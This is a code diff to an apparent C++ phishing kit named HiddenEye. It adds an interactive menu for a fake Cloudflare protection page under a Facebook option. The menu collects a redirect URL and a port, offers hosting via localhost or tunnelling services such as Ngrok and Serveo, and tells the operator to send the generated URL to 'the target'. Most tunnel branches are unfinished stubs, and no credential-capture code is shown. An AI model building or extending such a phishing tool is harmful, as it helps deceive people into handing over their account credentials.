@@ -15,7 +15,7 @@ int main()
     int option;
     bool validate = true;
 
-    show_progress_bar(100, "Loading Hidden-Eye ...", '#');
+    // show_progress_bar(100, "Loading Hidden-Eye ...", '#');
     system("clear");
     do
     {
@@ -636,8 +636,307 @@ void Facebook(int option, bool validate)
                         //2) Fake CloudFare Protection Page
                         else if (option == 2)
                         {
-                            show_progress_bar(100, "Loading Fake CloudFare Modules ...", '*');
+                            // show_progress_bar(100, "Loading Fake CloudFare Modules ...", '*');
 
+                            system("clear");
+
+                            std::cout << "\033[1;31m"
+                                      << R"(
+ _  _  __  ____  ____  ____  __ _       ____  _  _  ____ 
+/ )( \(  )(    \(    \(  __)(  ( \     (  __)( \/ )(  __)
+) __ ( )(  ) D ( ) D ( ) _) /    /      ) _)  )  /  ) _)    by Muhammad Qazi
+\_)(_/(__)(____/(____/(____)\_)__)     (____)(__/  (____)
+
+                          https://github.com/muhammadqazi
+            )" << endl;
+
+                            std::cout << "\n\033[1;31m"
+                                      << "[ "
+                                      << "\033[1;34m"
+                                      << "Prompt : Put your redirect URL here"
+                                      << "\033[1;31m"
+                                      << " ]\n\n";
+
+                            std::cout << "\033[1;31m"
+                                      << "--------------------------------------------------------------------------------------------------\n\n";
+
+                            std::cout << "\033[1;31m"
+                                      << "["
+                                      << "\033[1;37m"
+                                      << " *"
+                                      << "\033[1;31m"
+                                      << " ]"
+                                      << "\033[1;37m"
+                                      << " Insert a custom redirect URL\n\n";
+
+                            std::cout << "\033[1;31m"
+                                      << " Redirect URL >> "
+                                      << "\033[1;37m";
+
+                            string redirect_url;
+
+                            std::cin >> redirect_url;
+
+                            system("clear");
+
+                            std::cout << "\033[1;31m"
+                                      << R"(
+ _  _  __  ____  ____  ____  __ _       ____  _  _  ____ 
+/ )( \(  )(    \(    \(  __)(  ( \     (  __)( \/ )(  __)
+) __ ( )(  ) D ( ) D ( ) _) /    /      ) _)  )  /  ) _)    by Muhammad Qazi
+\_)(_/(__)(____/(____/(____)\_)__)     (____)(__/  (____)
+
+                          https://github.com/muhammadqazi
+            )" << endl;
+
+                            std::cout << "\n\033[1;31m"
+                                      << "[ "
+                                      << "\033[1;34m"
+                                      << "Prompt : Web Server Port Selection"
+                                      << "\033[1;31m"
+                                      << " ]\n\n";
+
+                            std::cout << "\033[1;31m"
+                                      << "--------------------------------------------------------------------------------------------------\n\n";
+
+                            std::cout << "\033[1;31m"
+                                      << "["
+                                      << "\033[1;37m"
+                                      << " *"
+                                      << "\033[1;31m"
+                                      << " ]"
+                                      << "\033[1;37m"
+                                      << " Select Port [1-65535]\n\n";
+
+                            std::cout << "\033[1;31m"
+                                      << "["
+                                      << "\033[1;37m"
+                                      << " *"
+                                      << "\033[1;31m"
+                                      << " ]"
+                                      << "\033[1;37m"
+                                      << " We suggest using ports between [1024-65535] but you still able to choose any ports you want.\n\n";
+
+                            std::cout << "\033[1;31m"
+                                      << "["
+                                      << "\033[1;37m"
+                                      << " *"
+                                      << "\033[1;31m"
+                                      << " ]"
+                                      << "\033[1;37m"
+                                      << " In case of Ngrok use the port you set for Ngrok\n\n";
+
+                            std::cout << "\033[1;31m"
+                                      << " Redirect Port >> "
+                                      << "\033[1;37m";
+
+                            int port;
+
+                            std::cin >> port;
+
+                            system("clear");
+
+                            std::cout << "\033[1;31m"
+                                      << R"(
+ _  _  __  ____  ____  ____  __ _       ____  _  _  ____ 
+/ )( \(  )(    \(    \(  __)(  ( \     (  __)( \/ )(  __)
+) __ ( )(  ) D ( ) D ( ) _) /    /      ) _)  )  /  ) _)    by Muhammad Qazi
+\_)(_/(__)(____/(____/(____)\_)__)     (____)(__/  (____)
+
+                          https://github.com/muhammadqazi
+            )" << endl;
+
+                            std::cout << "\n\033[1;31m"
+                                      << "[ "
+                                      << "\033[1;34m"
+                                      << "Prompt : Hosting Server Selection"
+                                      << "\033[1;31m"
+                                      << " ]\n\n";
+
+                            std::cout << "\033[1;31m"
+                                      << "--------------------------------------------------------------------------------------------------\n\n";
+
+                            std::cout << "\033[1;31m"
+                                      << "["
+                                      << "\033[1;37m"
+                                      << " *"
+                                      << "\033[1;31m"
+                                      << " ]"
+                                      << "\033[1;37m"
+                                      << " Selecy any availible server\n\n";
+                            do
+                            {
+                                //1) localhost
+                                std::cout << "\033[1;31m"
+                                          << "["
+                                          << "\033[1;37m"
+                                          << " 01"
+                                          << "\033[1;31m"
+                                          << " ]"
+                                          << "\033[1;37m"
+                                          << " Localhost\t\t\t\t";
+
+                                //2) Ngrok
+                                std::cout << "\033[1;31m"
+                                          << "["
+                                          << "\033[1;37m"
+                                          << " 02"
+                                          << "\033[1;31m"
+                                          << " ]"
+                                          << "\033[1;37m"
+                                          << " Ngrok\n\n";
+
+                                //3) Serveo
+                                std::cout << "\033[1;31m"
+                                          << "["
+                                          << "\033[1;37m"
+                                          << " 03"
+                                          << "\033[1;31m"
+                                          << " ]"
+                                          << "\033[1;37m"
+                                          << " Serveo\t\t\t\t\t";
+
+                                //4) Localxpose
+                                std::cout << "\033[1;31m"
+                                          << "["
+                                          << "\033[1;37m"
+                                          << " 04"
+                                          << "\033[1;31m"
+                                          << " ]"
+                                          << "\033[1;37m"
+                                          << " Localxpose\n\n";
+
+                                //5) localTunnel
+                                std::cout << "\033[1;31m"
+                                          << "["
+                                          << "\033[1;37m"
+                                          << " 05"
+                                          << "\033[1;31m"
+                                          << " ]"
+                                          << "\033[1;37m"
+                                          << " Localtunnel\t\t\t\t";
+
+                                //6) OpenPort
+                                std::cout << "\033[1;31m"
+                                          << "["
+                                          << "\033[1;37m"
+                                          << " 06"
+                                          << "\033[1;31m"
+                                          << " ]"
+                                          << "\033[1;37m"
+                                          << " OpenPort\n\n";
+
+                                //7) PageKite
+                                std::cout << "\033[1;31m"
+                                          << "["
+                                          << "\033[1;37m"
+                                          << " 07"
+                                          << "\033[1;31m"
+                                          << " ]"
+                                          << "\033[1;37m"
+                                          << " PageKite\n\n";
+
+                                if (!validate)
+                                {
+                                    std::cout << "\033[1;31m"
+                                                 "Enter the correct option\n\n"
+                                              << endl;
+                                }
+
+                                std::cout << "\033[1;31m"
+                                          << "HiddenEye >> "
+                                          << "\033[1;37m";
+                                std::cin >> option;
+
+                                validate = Validator(option, 1, 7);
+
+                                if (validate)
+                                {
+                                    //1) localhost
+                                    if (option == 1)
+                                    {
+                                        system("clear");
+
+                                        std::cout << "\033[1;31m"
+                                                  << R"(
+ _  _  __  ____  ____  ____  __ _       ____  _  _  ____ 
+/ )( \(  )(    \(    \(  __)(  ( \     (  __)( \/ )(  __)
+) __ ( )(  ) D ( ) D ( ) _) /    /      ) _)  )  /  ) _)    by Muhammad Qazi
+\_)(_/(__)(____/(____/(____)\_)__)     (____)(__/  (____)
+
+                          https://github.com/muhammadqazi
+            )" << endl;
+
+                                        std::cout << "\n\033[1;31m"
+                                                  << "[ "
+                                                  << "\033[1;34m"
+                                                  << "Prompt : Running Localhost server"
+                                                  << "\033[1;31m"
+                                                  << " ]\n\n";
+
+                                        std::cout << "\033[1;31m"
+                                                  << "--------------------------------------------------------------------------------------------------\n\n";
+
+                                        std::cout << "\033[1;31m"
+                                                  << "["
+                                                  << "\033[1;37m"
+                                                  << " *"
+                                                  << "\033[1;31m"
+                                                  << " ]"
+                                                  << "\033[1;37m"
+                                                  << " Send this URL to the target on the same nertwork\n\n";
+
+                                        std::cout << "\033[1;31m"
+                                                  << "["
+                                                  << "\033[1;37m"
+                                                  << " *"
+                                                  << "\033[1;31m"
+                                                  << " ]"
+                                                  << "\033[1;32m"
+                                                  << " Localhost URL : https://localhost:" << port << "\n\n";
+
+                                        std::cout << "\033[1;31m"
+                                                  << "["
+                                                  << "\033[1;37m"
+                                                  << " *"
+                                                  << "\033[1;31m"
+                                                  << " ]"
+                                                  << "\033[1;37m"
+                                                  << " Server is Listening to Port :" << port << " Waitinng for the target interaction\n\n";
+                                    }
+                                    //2) Ngrok
+                                    else if (option == 2)
+                                    {
+                                        std::cout << option;
+                                    }
+                                    //3) Serveo
+                                    else if (option == 3)
+                                    {
+                                        std::cout << option;
+                                    }
+                                    //4) Localxpose
+                                    else if (option == 4)
+                                    {
+                                        std::cout << option;
+                                    }
+                                    //5) localTunnel
+                                    else if (option == 5)
+                                    {
+                                        std::cout << option;
+                                    }
+                                    //6) OpenPort
+                                    else if (option == 6)
+                                    {
+                                        std::cout << option;
+                                    }
+                                    //7) PakeKite
+                                    else if (option == 7)
+                                    {
+                                        std::cout << option;
+                                    }
+                                }
+
+                            } while (!validate);
                         }
                         //3) Capture Data Email
                         else if (option == 3)
